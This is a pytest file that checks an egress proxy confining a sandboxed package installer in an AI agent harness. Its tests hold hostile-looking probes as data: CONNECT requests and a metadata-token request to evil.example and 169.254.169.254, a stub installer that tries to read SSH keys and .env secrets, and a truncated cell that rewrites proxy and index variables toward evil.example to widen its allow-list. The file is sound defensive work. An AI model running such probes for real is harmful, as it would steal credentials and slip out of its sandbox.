"""The package installer reaches the package index and nothing else.

The installer runs ``uv`` inside bubblewrap with no network of its own
(test_install_confinement.py covers the rest of its confinement). Its one
route out is a loopback port forwarded to the harness's allow-listing
CONNECT proxy (``sandbox.EgressProxy``), which opens tunnels only to the
package index hosts (``environment.index_hosts``: PyPI, or a mirror the
operator configured with ``UV_INDEX*``), and never to a loopback,
link-local or private address, whatever a name resolves to. So the host's
loopback services and the cloud metadata server (``169.254.169.254``, which
hands out a GCP worker's service-account token) are out of reach, and
nothing a cell does adds a host.

No model is called and nothing leaves the machine: the proxy is driven
directly over its socket; a stub ``uv`` probes the network from inside the
installer's sandbox; the real ``uv`` is pointed at hosts the proxy refuses
before resolving them; a cell in the sandboxed worker tries to widen the
allow-list with the installer stubbed.
"""

from __future__ import annotations

import inspect
import json
import logging
import os
import socket
import subprocess
import sys
import textwrap
import threading
import time
import types
from contextlib import contextmanager
from pathlib import Path

import pytest

from tests.helpers import _handle_project
from tests.actor.code_act.core_world import (  # noqa: F401 (fixtures)
    core_world,
    new_actor,
)
from tests.actor.code_act.sandbox_world import (  # noqa: F401 (fixture)
    ENV_SECRET,
    SSH_SECRET,
    STATE_SECRET,
    TOKEN_VALUE,
    needs_bwrap,
    world,
)
from unify import environment, sandbox

_REAL_RESOLVE = sandbox._resolve
_REAL_PUBLIC = sandbox.public_address


class _Listener:
    """A host TCP service on loopback that counts connections and answers them."""

    def __init__(self, reply: bytes = b"from host\n") -> None:
        self.accepted = 0
        self._srv = socket.socket()
        self._srv.bind(("127.0.0.1", 0))
        self._srv.listen(8)
        self.port = self._srv.getsockname()[1]
        self._reply = reply
        threading.Thread(target=self._loop, daemon=True).start()

    def _loop(self) -> None:
        while True:
            try:
                conn, _ = self._srv.accept()
            except OSError:
                return
            self.accepted += 1
            try:
                conn.sendall(self._reply)
            finally:
                conn.close()

    def close(self) -> None:
        try:
            self._srv.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self._srv.close()


@pytest.fixture
def listener():
    srv = _Listener()
    yield srv
    srv.close()


def _ask(proxy: sandbox.EgressProxy, request: bytes) -> tuple[str, bytes]:
    """Send *request* to *proxy*'s socket: its status line, and what followed."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(15)
    try:
        s.connect(str(proxy.path))
        s.sendall(request)
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        if head.startswith(b"HTTP/1.1 200"):
            try:
                rest += s.recv(4096)
            except OSError:
                pass
        return head.split(b"\r\n", 1)[0].decode(), rest
    finally:
        s.close()


def _connect(target: str) -> bytes:
    return f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()


@contextmanager
def _logged(name: str):
    """The messages logged to *name* inside the block (Unify's loggers do
    not propagate to the root, where caplog listens)."""
    records: list[str] = []
    handler = logging.Handler(logging.DEBUG)
    handler.emit = lambda record: records.append(record.getMessage())
    logger = logging.getLogger(name)
    logger.addHandler(handler)
    try:
        yield records
    finally:
        logger.removeHandler(handler)


@pytest.fixture
def loopback_index(monkeypatch):
    """Every name resolves to 127.0.0.1, which the address filter is told is
    public: a loopback listener stands in for an index host."""
    monkeypatch.setattr(
        sandbox,
        "_resolve",
        lambda host, port: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port)),
        ],
    )
    monkeypatch.setattr(
        sandbox,
        "public_address",
        lambda a: a == "127.0.0.1" or _REAL_PUBLIC(a),
    )


def _client_hello(sni: str | None, *, ech: bool = False) -> bytes:
    """A minimal TLS ClientHello record naming *sni* (none when None),
    with an encrypted_client_hello extension when *ech*."""
    extensions = b""
    if sni is not None:
        name = sni.encode()
        entry = b"\x00" + len(name).to_bytes(2, "big") + name
        data = len(entry).to_bytes(2, "big") + entry
        extensions += b"\x00\x00" + len(data).to_bytes(2, "big") + data
    if ech:
        extensions += b"\xfe\x0d" + (4).to_bytes(2, "big") + b"\x00\x01\x02\x03"
    body = (
        b"\x03\x03"
        + bytes(32)  # random
        + b"\x00"  # session id
        + b"\x00\x02\x13\x01"  # one cipher suite
        + b"\x01\x00"  # null compression
        + len(extensions).to_bytes(2, "big")
        + extensions
    )
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(handshake).to_bytes(2, "big") + handshake


def _tunnel(proxy: sandbox.EgressProxy, target: str, first: bytes) -> tuple[str, bytes]:
    """CONNECT to *target*, send *first* in the tunnel: the status line and
    whatever came back through the tunnel before it closed."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(15)
    try:
        s.connect(str(proxy.path))
        s.sendall(_connect(target))
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        status = head.split(b"\r\n", 1)[0].decode()
        if status.startswith("HTTP/1.1 200"):
            s.sendall(first)
            try:
                while chunk := s.recv(4096):
                    rest += chunk
            except OSError:
                pass
        return status, rest
    finally:
        s.close()


# ── the proxy itself ────────────────────────────────────────────────────────


@pytest.mark.timeout(60)
def test_the_proxy_refuses_every_host_off_the_allow_list(listener, monkeypatch):
    resolved: list[str] = []

    def watched(host, port):
        resolved.append(host)
        return _REAL_RESOLVE(host, port)

    monkeypatch.setattr(sandbox, "_resolve", watched)
    with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as proxy:
        for target in (
            "evil.example:443",
            "169.254.169.254:80",
            "169.254.169.254:443",
            "metadata.google.internal:80",
            f"127.0.0.1:{listener.port}",
            f"localhost:{listener.port}",
            "[::1]:443",
            # An allowed host on another port.
            "pypi.org:80",
        ):
            status, _ = _ask(proxy, _connect(target))
            assert status.startswith("HTTP/1.1 403"), (target, status)
        # Anything but a tunnel: a plain-HTTP request through the proxy.
        status, body = _ask(
            proxy,
            b"GET http://169.254.169.254/computeMetadata/v1/ HTTP/1.1\r\n"
            b"Host: 169.254.169.254\r\nMetadata-Flavor: Google\r\n\r\n",
        )
        assert status.startswith("HTTP/1.1 405"), status
        assert b"only CONNECT" in body
        status, _ = _ask(proxy, _connect("pypi.org"))
        assert status.startswith("HTTP/1.1 400"), status
        refused = [target for target, _ in proxy.refused]
    assert "evil.example:443" in refused and "169.254.169.254:80" in refused
    # Refused by name, before any lookup or connection.
    assert resolved == []
    assert listener.accepted == 0


@pytest.mark.timeout(60)
def test_the_proxy_never_reaches_a_non_public_address_whatever_a_name_resolves_to(
    listener,
    monkeypatch,
):
    # An allowed name that resolves to the metadata server, to loopback (the
    # host's own services) or to a private address is still refused.
    answers = {
        "pypi.org": "169.254.169.254",
        "files.pythonhosted.org": "10.0.0.7",
        "mirror.example": "127.0.0.1",
    }

    def resolve(host, port):
        if host == "localhost":
            return _REAL_RESOLVE(host, port)
        family = socket.AF_INET6 if ":" in answers[host] else socket.AF_INET
        return [(family, socket.SOCK_STREAM, 6, "", (answers[host], port))]

    monkeypatch.setattr(sandbox, "_resolve", resolve)
    allowed = [
        ("pypi.org", 443),
        ("files.pythonhosted.org", 443),
        ("mirror.example", listener.port),
        ("localhost", listener.port),
    ]
    with sandbox.egress_proxy(allowed) as proxy:
        for target in (
            "pypi.org:443",
            "files.pythonhosted.org:443",
            f"mirror.example:{listener.port}",
            f"localhost:{listener.port}",
            f"LOCALHOST.:{listener.port}",
        ):
            status, body = _ask(proxy, _connect(target))
            assert status.startswith("HTTP/1.1 403"), (target, status)
            assert b"non-public" in body, body
    assert listener.accepted == 0


@pytest.mark.parametrize(
    ("address", "public"),
    [
        ("151.101.0.223", True),  # pypi.org (Fastly)
        ("2a04:4e42::223", True),
        ("169.254.169.254", False),  # the metadata server
        ("fd00:ec2::254", False),  # AWS's IPv6 metadata server
        ("127.0.0.1", False),
        ("127.8.9.10", False),
        ("::1", False),
        ("0.0.0.0", False),
        ("::", False),
        ("10.1.2.3", False),
        ("172.16.0.1", False),
        ("192.168.1.1", False),
        ("100.64.0.1", False),  # shared (CGNAT)
        ("fe80::1", False),
        ("fe80::1%eth0", False),
        ("fc00::1", False),
        ("224.0.0.1", False),
        ("::ffff:169.254.169.254", False),  # IPv4-mapped
        ("::ffff:127.0.0.1", False),
        ("2002:a9fe:a9fe::1", False),  # 6to4 around the metadata server
        ("64:ff9b::a9fe:a9fe", False),  # NAT64 to the metadata server
        ("64:ff9b::7f00:1", False),  # NAT64 to loopback
        ("64:ff9b::9765:df", True),  # NAT64 to pypi.org
        ("64:ff9b:1::a9fe:a9fe", False),  # local-use NAT64
        ("::a9fe:a9fe", False),  # IPv4-compatible, the metadata server
        ("::7f00:1", False),  # IPv4-compatible loopback
        ("::ffff:0:a9fe:a9fe", False),  # SIIT (IPv4-translated)
        ("fec0::1", False),  # site-local
        ("5f00::1", False),  # outside 2000::/3
        ("2001:db8::1", False),  # documentation
        ("2002:9765:df::1", False),  # 6to4, even around a public address
        ("not-an-address", False),
    ],
)
def test_public_addresses(address, public):
    assert sandbox.public_address(address) is public


@pytest.mark.timeout(60)
def test_the_proxy_tunnels_to_an_allowed_host(listener, monkeypatch):
    """The positive path: an allowed host gets a tunnel. The host here is a
    loopback listener, so the address filter is told it is public."""
    monkeypatch.setattr(
        sandbox,
        "_resolve",
        lambda host, port: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port)),
        ],
    )
    monkeypatch.setattr(
        sandbox,
        "public_address",
        lambda a: a == "127.0.0.1" or _REAL_PUBLIC(a),
    )
    with sandbox.egress_proxy([("index.test", listener.port)]) as proxy:
        status, data = _tunnel(
            proxy,
            f"index.test:{listener.port}",
            _client_hello("Index.Test."),
        )
        assert status == "HTTP/1.1 200 Connection established", status
        assert data == b"from host\n"
        status, _ = _ask(proxy, _connect(f"other.test:{listener.port}"))
        assert status.startswith("HTTP/1.1 403")
    assert listener.accepted == 1
    # Closed: the socket's directory is gone.
    assert not proxy.directory.exists()


@pytest.mark.parametrize(
    ("first", "reason"),
    [
        (_client_hello("evil.example"), "SNI must be the CONNECT host"),
        (_client_hello(None), "no SNI"),
        (_client_hello("index.test", ech=True), "encrypted_client_hello"),
        (b"GET / HTTP/1.1\r\nHost: evil.example\r\n\r\n", "not a TLS handshake"),
        (b"\x16\x03\x01\xff\xff" + bytes(16), "out of bounds"),
    ],
)
@pytest.mark.timeout(60)
def test_a_tunnel_carries_nothing_unless_its_tls_server_is_the_connect_host(
    listener,
    monkeypatch,
    first,
    reason,
):
    """The index hosts share a CDN's addresses with other sites, so a tunnel
    relays only after a ClientHello naming the CONNECT host itself; another
    name, none, an encrypted ClientHello, plaintext or a malformed record
    closes it with nothing relayed either way."""
    monkeypatch.setattr(
        sandbox,
        "_resolve",
        lambda host, port: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port)),
        ],
    )
    monkeypatch.setattr(
        sandbox,
        "public_address",
        lambda a: a == "127.0.0.1" or _REAL_PUBLIC(a),
    )
    with sandbox.egress_proxy([("index.test", listener.port)]) as proxy:
        status, data = _tunnel(proxy, f"index.test:{listener.port}", first)
        assert status == "HTTP/1.1 200 Connection established", status
        assert data == b""
        reasons = [r for _, r in proxy.refused]
    assert any(reason in r for r in reasons), reasons


@pytest.mark.timeout(60)
def test_tunnels_are_capped_and_closed_with_the_proxy(monkeypatch):
    monkeypatch.setattr(sandbox, "_MAX_TUNNELS", 1)
    held = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    held.settimeout(15)
    with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as proxy:
        # A connection that never finishes its request head holds the slot.
        held.connect(str(proxy.path))
        held.sendall(b"CONNECT pypi.org:443 HTTP/1.1\r\n")
        deadline = 50
        while not proxy._open and deadline:
            threading.Event().wait(0.1)
            deadline -= 1
        status, body = _ask(proxy, _connect("pypi.org:443"))
        assert status.startswith("HTTP/1.1 503"), status
        assert b"tunnels at once" in body
    # close() ended the held connection rather than leaving it to time out.
    assert held.recv(4096) == b""
    held.close()


@contextmanager
def _thread_exceptions():
    """The exceptions that escaped a thread inside the block."""
    escaped: list[type] = []
    before = threading.excepthook
    threading.excepthook = lambda args: escaped.append(args.exc_type)
    try:
        yield escaped
    finally:
        threading.excepthook = before


def _slot_freed(proxy: sandbox.EgressProxy) -> bool:
    """Whether the proxy's one tunnel slot (``_MAX_TUNNELS`` patched to 1)
    is free again, waiting for its handler to finish."""
    if not proxy._slots.acquire(timeout=5):
        return False
    proxy._slots.release()
    return True


def test_a_connect_port_is_ascii_digits_only():
    # "²" passes str.isdigit but not int(); Arabic-Indic digits pass both.
    assert sandbox._authority("pypi.org:44\xb3") is None
    assert sandbox._authority("pypi.org:\u0664\u0664\u0663") is None
    assert sandbox._authority("pypi.org:443") == ("pypi.org", 443)
    assert sandbox._authority("[2a04:4e42::223]:443") == ("2a04:4e42::223", 443)


@pytest.mark.parametrize(
    ("request_bytes", "status"),
    [
        # A latin-1 superscript digit in the port: crashed the handler.
        (b"CONNECT pypi.org:44\xb3 HTTP/1.1\r\n\r\n", "400"),
        (_connect("pypi.org:443@evil.example"), "400"),
        (_connect("evil@pypi.org:443"), "403"),
        (_connect("pypi.org"), "400"),
        (_connect("pypi.org:0"), "400"),
        (_connect("pypi.org:65536"), "400"),
        (b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", "405"),
        (b"connect pypi.org:443 HTTP/1.1\r\n\r\n", "405"),
        (b"CONNECT pypi.org:443 HTTP/1.1 extra\r\n\r\n", "405"),
    ],
    ids=[
        "superscript-port",
        "port-then-userinfo",
        "userinfo-then-host",
        "no-port",
        "port-0",
        "port-65536",
        "http2-preface",
        "lowercase-connect",
        "four-fields",
    ],
)
@pytest.mark.timeout(60)
def test_the_connect_parser_refuses_what_is_not_an_allowed_authority(
    monkeypatch,
    request_bytes,
    status,
):
    """Each malformed or disguised request gets an HTTP refusal, nothing is
    resolved, no exception escapes the handler and its slot is freed."""
    resolved: list[str] = []

    def watched(host, port):
        resolved.append(host)
        raise OSError("no lookups in this test")

    monkeypatch.setattr(sandbox, "_resolve", watched)
    monkeypatch.setattr(sandbox, "_MAX_TUNNELS", 1)
    with _thread_exceptions() as escaped:
        with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as proxy:
            got, _ = _ask(proxy, request_bytes)
            assert got.startswith(f"HTTP/1.1 {status}"), got
            assert _slot_freed(proxy)
    assert escaped == []
    assert resolved == []


@pytest.mark.timeout(60)
def test_an_exception_in_the_handler_frees_its_slot_and_sockets(monkeypatch):
    """Whatever fails while a request is handled, the handler ends cleanly:
    the client's connection is closed, its slot freed, nothing left tracked
    and nothing escapes the thread; the model reads only a fixed note."""

    def broken(text):
        raise RuntimeError(f"client text {text}")

    monkeypatch.setattr(sandbox, "_authority", broken)
    monkeypatch.setattr(sandbox, "_MAX_TUNNELS", 1)
    with _thread_exceptions() as escaped:
        with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as proxy:
            got, _ = _ask(proxy, _connect("pypi.org:443"))
            assert got == "", got
            assert _slot_freed(proxy)
            assert proxy._open == set()
            note = environment._refusal_note(proxy)
            reasons = [r for _, r in proxy.refused]
    assert escaped == []
    assert reasons == ["the proxy failed on a request (RuntimeError)"], reasons
    assert "a request the proxy could not handle" in note
    assert "client text" not in note and "pypi.org" not in note


def _held_until_closed(
    proxy: sandbox.EgressProxy,
    first: bytes,
    trickle: bytes,
) -> float:
    """Connect, send *first*, then *trickle* every 0.1 s, reading whatever
    comes back: the seconds until the proxy closed the connection (at most 4)."""
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(0.1)
    start = time.monotonic()
    try:
        s.connect(str(proxy.path))
        s.sendall(first)
        while time.monotonic() - start < 4:
            try:
                s.sendall(trickle)
                chunk = s.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                break  # reset or broken pipe: closed
            if not chunk:
                break
        return time.monotonic() - start
    finally:
        s.close()


@pytest.mark.timeout(60)
def test_a_request_head_has_one_deadline(monkeypatch):
    """A client sending its CONNECT head a byte at a time, each well within
    the per-read timeout, is still cut off when the head's deadline passes:
    otherwise 32 such clients would hold every tunnel slot for hours."""
    monkeypatch.setattr(sandbox, "_PROXY_HANDSHAKE_S", 0.5)
    with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as proxy:
        held = _held_until_closed(proxy, b"C", b"O")
        reasons = [r for _, r in proxy.refused]
    assert held < 2.5, held
    assert any("no complete request head within 0.5 s" in r for r in reasons), reasons


@pytest.mark.timeout(60)
def test_a_tunnel_without_a_client_hello_in_time_is_closed(
    listener,
    loopback_index,
    monkeypatch,
):
    """After the 200 the client's ClientHello must arrive whole within the
    peek's deadline (10 s, shortened here), however it trickles in."""
    monkeypatch.setattr(sandbox, "_CLIENT_HELLO_S", 0.5)
    hello = _client_hello("index.test")
    with sandbox.egress_proxy([("index.test", listener.port)]) as proxy:
        # The CONNECT and the hello's first bytes, then one byte a tick.
        held = _held_until_closed(
            proxy,
            _connect(f"index.test:{listener.port}") + hello[:6],
            hello[6:7],
        )
        reasons = [r for _, r in proxy.refused]
    assert held < 2.5, held
    assert any("no complete ClientHello within 0.5 s" in r for r in reasons), reasons


@pytest.mark.timeout(60)
def test_refusals_are_bounded_and_the_model_never_reads_client_text(
    listener,
    loopback_index,
):
    """A package's code in the installer's sandbox can open as many refused
    tunnels as it likes, each naming a target or TLS server of its choice.
    Only the first few are kept and logged, each cut short; the rest are
    counted; and the note appended to the install's output (which the model
    reads) quotes neither the CONNECT targets nor the server names."""
    with _logged("unify.sandbox") as records:
        with sandbox.egress_proxy([("index.test", listener.port)]) as proxy:
            long_name = "injected-" + "x" * 6000 + ".example:443"
            status, _ = _ask(proxy, f"CONNECT {long_name} HTTP/1.1\r\n\r\n".encode())
            assert status.startswith("HTTP/1.1 403"), status
            status, data = _tunnel(
                proxy,
                f"index.test:{listener.port}",
                _client_hello("injected-sni.example"),
            )
            assert status.startswith("HTTP/1.1 200") and data == b"", status
            for i in range(60):
                status, _ = _ask(proxy, _connect(f"injected-{i}.example:443"))
                assert status.startswith("HTTP/1.1 403"), status
            note = environment._refusal_note(proxy)
            kept, unlisted = list(proxy.refused), proxy.unlisted
    assert len(kept) == sandbox._REFUSALS_KEPT, len(kept)
    assert unlisted == 62 - sandbox._REFUSALS_KEPT
    limit = sandbox._REFUSAL_TEXT + 3
    assert all(len(t) <= limit and len(r) <= limit for t, r in kept), kept[0]
    warnings = [r for r in records if r.startswith("installer proxy")]
    assert len(warnings) <= sandbox._REFUSALS_KEPT + 2, len(warnings)
    assert f"{unlisted} more refusals" in warnings[-1]
    assert "injected" not in note and "example" not in note, note
    assert "a host off the allow-list" in note
    assert "TLS server name was not its CONNECT host" in note
    assert f"(+{unlisted} more refusals)" in note
    assert len(note) < 1000, len(note)


def test_userinfo_never_survives_in_an_index_or_proxy_url():
    strip = environment._without_userinfo
    proxy = "http://u:tok@proxy:3128"  # pragma: allowlist secret
    assert strip(proxy) == "http://proxy:3128"
    named = "idx=https://u:p@m.example/simple"  # pragma: allowlist secret
    assert strip(named) == "idx=https://m.example/simple"
    assert strip("https://host/simple") == "https://host/simple"
    # Unparseable shapes are dropped whole, never passed on with the secret.
    assert strip("u:tok@host/simple") == ""  # pragma: allowlist secret
    assert strip("https://u:p/ss@host/simple") == ""  # pragma: allowlist secret
    hosts = environment.index_hosts(
        {"UV_INDEX_URL": "https://zero.example:0/s https://ok.example:8443/s"},
    )
    assert ("ok.example", 8443) in hosts
    assert not any(host == "zero.example" for host, _ in hosts)


# ── the allow-list: the harness's, never a cell's ──────────────────────────


def test_the_allow_list_is_the_index_and_the_operators_mirrors():
    assert environment.index_hosts({}) == (
        ("pypi.org", 443),
        ("files.pythonhosted.org", 443),
    )
    hosts = environment.index_hosts(
        {
            "UV_INDEX_URL": "https://Mirror.Example:8443/simple",
            "UV_EXTRA_INDEX_URL": "https://a.example/simple https://b.example/s",
            "UV_INDEX": "internal=https://c.example/simple http://plain.example/",
            "UV_DEFAULT_INDEX": "https://user:pw@d.example/simple",  # pragma: allowlist secret
            # Not an index variable.
            "PIP_INDEX_URL": "https://e.example/simple",
        },
    )
    assert hosts == (
        ("pypi.org", 443),
        ("files.pythonhosted.org", 443),
        ("mirror.example", 8443),
        ("d.example", 443),
        ("a.example", 443),
        ("b.example", 443),
        ("c.example", 443),
    )
    # install() names packages only: nothing a caller passes reaches the
    # proxy's allow-list.
    assert list(inspect.signature(environment.install).parameters) == [
        "specifiers",
        "timeout",
    ]


# ── inside the installer's sandbox ──────────────────────────────────────────

_STUB_UV = """#!{python} -I
# A stand-in for uv: probes what the installer's sandbox can reach.
import json, os, socket, sys

HOST_PORT = {port}
TARGETS = {targets!r}
OUTSIDE = {outside!r}
SECRETS = {secrets!r}
args = sys.argv[1:]
if args[:1] == ["venv"]:
    os.makedirs(os.path.join(args[-1], "bin"), exist_ok=True)
    open(os.path.join(args[-1], "bin", "python"), "w").close()
    sys.exit(0)
venv = os.path.dirname(os.path.dirname(args[args.index("--python") + 1]))


def direct(host, port):
    try:
        s = socket.create_connection((host, port), timeout=3)
    except OSError as exc:
        return "failed: " + type(exc).__name__
    try:
        return "connected: " + s.recv(64).decode(errors="replace")
    finally:
        s.close()


def hello(sni):
    name = sni.encode()
    entry = b"\\x00" + len(name).to_bytes(2, "big") + name
    data = len(entry).to_bytes(2, "big") + entry
    ext = b"\\x00\\x00" + len(data).to_bytes(2, "big") + data
    body = (b"\\x03\\x03" + bytes(32) + b"\\x00" + b"\\x00\\x02\\x13\\x01" + b"\\x01\\x00"
            + len(ext).to_bytes(2, "big") + ext)
    hs = b"\\x01" + len(body).to_bytes(3, "big") + body
    return b"\\x16\\x03\\x01" + len(hs).to_bytes(2, "big") + hs


def via_proxy(target):
    host, port = os.environ["HTTPS_PROXY"].rsplit("/", 1)[1].rsplit(":", 1)
    try:
        s = socket.create_connection((host, int(port)), timeout=5)
        s.settimeout(10)
        s.sendall(f"CONNECT {{target}} HTTP/1.1\\r\\nHost: {{target}}\\r\\n\\r\\n".encode())
        data = b""
        while b"\\r\\n\\r\\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        head, _, rest = data.partition(b"\\r\\n\\r\\n")
        if head.startswith(b"HTTP/1.1 200"):
            # As a TLS client would: a ClientHello naming the target host.
            s.sendall(hello(target.rsplit(":", 1)[0]))
            rest += s.recv(64)
        s.close()
        return head.split(b"\\r\\n", 1)[0].decode() + " | " + rest.decode().strip()
    except OSError as exc:
        return "failed: " + type(exc).__name__


seen = {{"argv": args, "env": dict(os.environ)}}
seen["direct"] = {{
    "host loopback": direct("127.0.0.1", HOST_PORT),
    "metadata server": direct("169.254.169.254", 80),
}}
seen["proxy"] = {{t: via_proxy(t) for t in TARGETS}}
try:
    with open(OUTSIDE, "w") as f:
        f.write("written by the installer")
    seen["wrote_outside"] = True
except OSError:
    seen["wrote_outside"] = False
readable = []
for path in SECRETS:
    try:
        with open(path) as f:
            readable.append(path + ": " + f.read(80))
    except OSError:
        pass
seen["read_secrets"] = readable
with open(os.path.join(venv, "uv-report.json"), "w") as f:
    json.dump(seen, f)
"""


def _stub_uv(world, monkeypatch, listener, targets) -> Path:
    """Put the probing ``uv`` first on PATH; returns where it writes its report."""
    bin_dir = world["home"].parent / "bin"
    bin_dir.mkdir()
    uv = bin_dir / "uv"
    uv.write_text(
        _STUB_UV.format(
            python=sys.executable,
            port=listener.port,
            targets=targets,
            outside=str(world["home"] / "written-by-the-installer"),
            secrets=[
                str(world["home"] / ".ssh" / "id_rsa"),
                str(world["home"] / ".env"),
                str(world["state"] / "logs" / "unify.log"),
            ],
        ),
    )
    uv.chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    return environment.environment_dir() / "uv-report.json"


@needs_bwrap
@pytest.mark.timeout(60)
def test_a_proxy_socket_the_sandbox_would_show_is_refused(world):
    """The proxy's socket is reachable in the sandbox only where the
    forwarder finds it: a ``TMPDIR`` inside the workspace (or a socket inside
    one of the command's binds) would let any cell connect to it, so the
    command line is refused; the default, the host's /tmp, is private."""
    policy = sandbox.build_policy(fresh=True)
    with sandbox.egress_proxy(environment.DEFAULT_INDEX_HOSTS) as egress:
        assert policy.readable_violation(egress.directory) is not None
        sandbox.wrap_argv(["true"], policy, egress=egress)
        with pytest.raises(sandbox.SandboxRefusal) as raised:
            sandbox.wrap_argv(
                ["true"],
                policy,
                writable=[egress.directory],
                egress=egress,
            )
    assert raised.value.rule == "installer-index-only"
    # A proxy whose directory a TMPDIR inside the workspace put there. Only
    # its directory matters to the refusal, which comes before anything is
    # bound, so no socket is made: a workspace path can be longer than a unix
    # socket address allows (108 bytes), as on the gate hosts.
    shown = world["workspace"] / "tmp" / "unify-installer-proxy-x"
    shown.mkdir(parents=True)
    egress = types.SimpleNamespace(directory=shown, path=shown / "proxy.sock")
    with pytest.raises(sandbox.SandboxRefusal) as raised:
        sandbox.wrap_argv(["true"], policy, egress=egress)
    assert raised.value.rule == "installer-index-only"
    assert "TMPDIR" in str(raised.value)


@needs_bwrap
@pytest.mark.timeout(120)
def test_the_installer_has_no_network_but_the_proxy_to_the_index(
    world,
    listener,
    monkeypatch,
):
    assert listener.port != sandbox.INSTALLER_PROXY_PORT
    for name, value in (
        ("OPENROUTER_API_KEY", "sk-or-fake-0c7d"),  # pragma: allowlist secret
        # The harness's own proxy settings never route the installer.
        ("HTTPS_PROXY", f"http://127.0.0.1:{listener.port}"),
        ("NO_PROXY", "*"),
    ):
        monkeypatch.setenv(name, value)
    targets = [
        f"127.0.0.1:{listener.port}",
        f"localhost:{listener.port}",
        "169.254.169.254:80",
        "metadata.google.internal:80",
        "evil.example:443",
    ]
    report = _stub_uv(world, monkeypatch, listener, targets)

    outcome = environment.install(["humanize"])
    assert outcome["success"], outcome
    seen = json.loads(report.read_text())
    assert seen["argv"][2:5] == ["--no-config", "--only-binary", ":all:"]
    # No network of its own: the host's loopback service and the metadata
    # server are unreachable directly ...
    for what, result in seen["direct"].items():
        assert result.startswith("failed"), (what, result)
    # ... and through the proxy, which is the only route out.
    assert seen["env"]["HTTPS_PROXY"] == (
        f"http://127.0.0.1:{sandbox.INSTALLER_PROXY_PORT}"
    )
    assert "NO_PROXY" not in seen["env"]
    for target, result in seen["proxy"].items():
        assert result.startswith("HTTP/1.1 403"), (target, result)
    assert listener.accepted == 0
    # A refusal reaches the caller with the rule behind it.
    assert "installer-index-only" in outcome["stderr"]
    assert "a host off the allow-list" in outcome["stderr"]
    # Never the target the client named: that text is the client's.
    assert "evil.example" not in outcome["stderr"]
    # What runs at install time is confined as a shell cell is.
    assert not any(sandbox.is_secret_name(k) for k in seen["env"]), seen["env"]
    assert TOKEN_VALUE not in seen["env"].values()
    assert seen["wrote_outside"] is False
    read = "\n".join(seen["read_secrets"])
    assert not any(s in read for s in (SSH_SECRET, ENV_SECRET, STATE_SECRET)), read


@needs_bwrap
@pytest.mark.timeout(120)
def test_an_operator_mirror_is_reached_through_the_proxy(
    world,
    listener,
    monkeypatch,
):
    """The positive path from inside the sandbox: the mirror the harness's
    ``UV_INDEX_URL`` names gets a tunnel (a loopback listener here, so the
    address filter is told it is public for this one name)."""
    monkeypatch.setenv("UV_INDEX_URL", f"https://index.test:{listener.port}/simple")

    def resolve(host, port):
        if host == "index.test":
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port))]
        return _REAL_RESOLVE(host, port)

    monkeypatch.setattr(sandbox, "_resolve", resolve)
    monkeypatch.setattr(
        sandbox,
        "public_address",
        lambda a: a == "127.0.0.1" or _REAL_PUBLIC(a),
    )
    report = _stub_uv(
        world,
        monkeypatch,
        listener,
        [f"index.test:{listener.port}", f"127.0.0.1:{listener.port}"],
    )

    outcome = environment.install(["humanize"])
    assert outcome["success"], outcome
    seen = json.loads(report.read_text())
    assert seen["proxy"][f"index.test:{listener.port}"] == (
        "HTTP/1.1 200 Connection established | from host"
    )
    # Not by address, though: only the allowed name.
    assert seen["proxy"][f"127.0.0.1:{listener.port}"].startswith("HTTP/1.1 403")
    assert seen["direct"]["host loopback"].startswith("failed")
    assert listener.accepted == 1


@needs_bwrap
@pytest.mark.timeout(180)
def test_real_uv_cannot_fetch_from_a_host_off_the_allow_list(world, monkeypatch):
    """The real installer, pointed by a specifier at a host the model chose
    and at the metadata server: the proxy refuses both before any lookup."""
    import shutil

    if shutil.which("uv") is None:
        pytest.skip("uv is not installed")
    monkeypatch.setenv("UV_HTTP_RETRIES", "0")
    resolved: list[str] = []

    def watched(host, port):
        resolved.append(host)
        raise OSError("no lookups in this test")

    monkeypatch.setattr(sandbox, "_resolve", watched)
    outcome = environment.install(
        ["probe @ https://evil.example/probe-0.1-py3-none-any.whl"],
    )
    assert not outcome["success"], outcome
    assert "installer-index-only" in outcome["stderr"], outcome["stderr"]
    assert "a host off the allow-list" in outcome["stderr"]
    outcome = environment.install(
        ["probe @ http://169.254.169.254/latest/probe-0.1-py3-none-any.whl"],
    )
    assert not outcome["success"], outcome
    assert "only CONNECT tunnels" in outcome["stderr"], outcome["stderr"]
    assert resolved == []
    assert environment.missing(["probe"]) == ["probe"]


# ── from a cell ─────────────────────────────────────────────────────────────

_WIDEN = textwrap.dedent(
    """\
    import os
    os.environ["UV_INDEX_URL"] = "https://evil.example/simple"
    os.environ["UV_EXTRA_INDEX_URL"] = "https://evil2.example/simple"
    os.environ["HTTPS_PROXY"] = "http://evil.example:8080"
    os.environ["NO_PROXY"] = "*"
    first = await install(["humanize"])
    try:
